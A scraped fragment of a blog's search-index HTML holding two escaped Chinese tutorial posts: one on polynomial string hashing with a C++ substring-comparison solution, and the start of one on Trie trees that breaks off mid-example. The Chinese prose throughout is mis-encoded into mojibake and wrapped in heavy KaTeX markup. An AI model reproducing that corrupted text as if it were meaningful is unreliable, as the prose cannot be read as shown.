;mo&gt;+&lt;/mo&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;hash(ABCD)=1*P^{3}+2*P^{2}+3*P^{1}+4*P^{0}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.897438em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.897438em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.897438em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.64444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é“é¢˜å¯ä»¥é¦–å…ˆåˆå§‹åŒ–ä¸€ä¸ªhæ•°ç»„ï¼Œh[i]å­˜å‚¨å‰iä¸ªå­—ç¬¦ä¸²çš„hashå€¼ï¼Œä¾‹å¦‚ï¼š&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;4&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;mi&gt;C&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h[1] = hash(A), h[2] = hash(AB), h[3]=hash(ABC), h[4]=hash(ABCD)&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.07153em;&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œé‚£ä¹ˆå­—ä¸²&lt;code&gt;BC&lt;/code&gt;çš„hashå€¼=&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;3&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;âˆ’&lt;/mo&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mo&gt;[&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mo&gt;]&lt;/mo&gt;&lt;mo&gt;âˆ—&lt;/mo&gt;&lt;msup&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;h[3]-h[1]*P^{2}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ’&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;âˆ—&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.13889em;&#34;&gt;P&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼Œå…¶å®å¦‚æœP=10ï¼Œå³åè¿›åˆ¶å°±ç›¸å½“äºBC=ABC-A*100=123-100=23ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚æœå­—ç¬¦ä¸²å¤ªé•¿åŠ¿å¿…ä¼šå¯¼è‡´å®ƒçš„hashå€¼éå¸¸å¤§ï¼Œé€ æˆæº¢å‡ºï¼Œæ‰€ä»¥ä¸€èˆ¬éœ€è¦å¯¹ä¸€ä¸ªå€¼è¿›è¡Œå–æ¨¡ä¾‹å¦‚&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msup&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mn&gt;64&lt;/mn&gt;&lt;/msup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;2^{64}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8141079999999999em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8141079999999999em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;ï¼ŒPé€šå¸¸å–131ï¼Œé‚£ä¹ˆhæ•°ç»„å¯ä»¥å®šä¹‰æˆ&lt;code&gt;unsigned long long&lt;/code&gt;ï¼Œæº¢å‡ºå°±ç›¸å½“äºå–æ¨¡ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆè¿™é“é¢˜çš„ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;iostream&amp;gt;

using namespace std;

int main()
{
    int n, m;
    unsigned long long h[100005], P = 131, p[100005]; // p[2] = P^2

    char str[100005];
    
    cin &amp;gt;&amp;gt; n &amp;gt;&amp;gt; m;
    cin &amp;gt;&amp;gt; str + 1;
    
    h[0] = 0;
    p[0] = 1;
    for(int i = 1; i &amp;lt;= n ; i ++)
    {
        p[i] = p[i - 1] * P;
        h[i] = h[i - 1] * P + str[i];
    }
    
    while(m--)
    {
        int a, b, c, d;
        cin &amp;gt;&amp;gt; a &amp;gt;&amp;gt; b &amp;gt;&amp;gt; c &amp;gt;&amp;gt; d;
        if((h[b] - h[a - 1] * p[b - a + 1]) == (h[d] - h[c - 1] * p[d - c + 1]))
            cout &amp;lt;&amp;lt; &amp;quot;Yes&amp;quot; &amp;lt;&amp;lt; endl;
        else
            cout &amp;lt;&amp;lt; &amp;quot;No&amp;quot; &amp;lt;&amp;lt; endl;
    }
    
}

&lt;/code&gt;&lt;/pre&gt;
">ã€æ•°æ®ç»“æ„ã€‘å­—ç¬¦ä¸²å“ˆå¸Œ</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/shu-ju-jie-gou-trie-shu-cun-chu-zi-fu-chuan/"" data-c="
          &lt;p&gt;Trieé€šå¸¸æ˜¯ç”¨äºå­—ç¬¦ä¸²å­—å…¸çš„æ’å…¥å’Œå­˜å‚¨ï¼Œæ‰€æœ‰åŒ…å«ç›¸åŒå‰ç¼€çš„å­—ç¬¦ä¸²æ‰€åœ¨Trieæ ‘çš„åŒä¸€æ¡è·¯å¾„ï¼Œç›´åˆ°å­—ç¬¦ä¸åŒååˆ†å‰ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;p&gt;goodå’Œgoogleä¸¤ä¸ªå­—ç¬¦ä¸²çš„å…¬å…±å‰ç¼€æ˜¯gooï¼Œé‚£ä¹ˆåœ¨Trieæ ‘ä¸­ï¼Œå®ƒä»¬ç”¨çš„æ˜¯åŒä¸€æ¡å‰ç¼€è·¯å¾„gooã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1627102053376.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä¾‹é¢˜ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ç»´æŠ¤ä¸€ä¸ªå­—ç¬¦ä¸²é›†åˆï¼Œæ”¯æŒä¸¤ç§æ“ä½œï¼š
I x å‘é›†åˆä¸­æ’å…¥ä¸€ä¸ªå­—ç¬¦ä¸² xï¼›
Q x è¯¢é—®ä¸€ä¸ªå­—ç¬¦ä¸²åœ¨é›†åˆä¸­å‡ºç°äº†å¤šå°‘æ¬¡ã€‚
å…±æœ‰ N ä¸ªæ“ä½œï¼Œè¾“å…¥çš„å­—ç¬¦ä¸²æ€»é•¿åº¦ä¸è¶…è¿‡ 105ï¼Œå­—ç¬¦ä¸²ä»…åŒ…å«å°å†™è‹±æ–‡å­—æ¯ã€‚

è¾“å…¥æ ¼å¼
ç¬¬ä¸€è¡ŒåŒ…å«æ•´æ•° Nï¼Œè¡¨ç¤ºæ“ä½œæ•°ã€‚
æ¥ä¸‹æ¥ N è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ“ä½œæŒ‡ä»¤ï¼ŒæŒ‡ä»¤ä¸º I x æˆ– Q x ä¸­çš„ä¸€ç§ã€‚

è¾“å‡ºæ ¼å¼
å¯¹äºæ¯ä¸ªè¯¢é—®æŒ‡ä»¤ Q xï¼Œéƒ½è¦è¾“å‡ºä¸€ä¸ªæ•´æ•°ä½œä¸ºç»“æœï¼Œè¡¨ç¤º x åœ¨é›†åˆä¸­å‡ºç°çš„æ¬¡æ•°ã€‚
æ¯ä¸ªç»“æœå ä¸€è¡Œã€‚

æ•°æ®èŒƒå›´
1â‰¤Nâ‰¤2âˆ—104

è¾“å…¥æ ·ä¾‹ï¼š
5
I abc
Q abc
Q ab
I ab
Q ab

è¾“å‡ºæ ·ä¾‹ï¼š
1
0
1
